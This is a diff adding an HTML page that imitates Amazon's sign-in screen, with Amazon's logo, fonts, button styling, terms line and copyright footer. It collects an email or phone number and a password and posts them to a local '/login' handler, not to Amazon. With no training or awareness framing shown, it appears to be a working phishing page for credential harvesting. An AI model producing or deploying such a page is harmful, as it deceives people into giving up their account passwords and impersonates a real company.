@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Amazon Sign-In</title>
+    <style>
+        body { font-family: "Amazon Ember",Arial,sans-serif; background-color: #fff; color: #111; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
+        .container { width: 350px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
+        .logo { width: 103px; margin-bottom: 20px; }
+        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; }
+        label { font-size: 13px; font-weight: 700; display: block; margin-bottom: 2px; }
+        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 3px; margin-bottom: 15px; box-sizing: border-box; }
+        button { width: 100%; background: linear-gradient(to bottom,#f7dfa5,#f0c14b); border: 1px solid #a88734; border-radius: 3px; padding: 5px; cursor: pointer; }
+        .footer { font-size: 11px; color: #555; margin-top: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
+    <div class="container">
+        <h1>Sign-In</h1>
+        <form action="/login" method="POST">
+            <label>Email or mobile phone number</label>
+            <input type="text" name="email" required>
+            <label>Password</label>
+            <input type="password" name="password" required>
+            <button type="submit">Sign-In</button>
+        </form>
+        <p style="font-size: 12px; margin-top: 15px;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
+    </div>
+    <div class="footer">© 1996-2024, Amazon.com, Inc. or its affiliates</div>
+</body>
+</html>
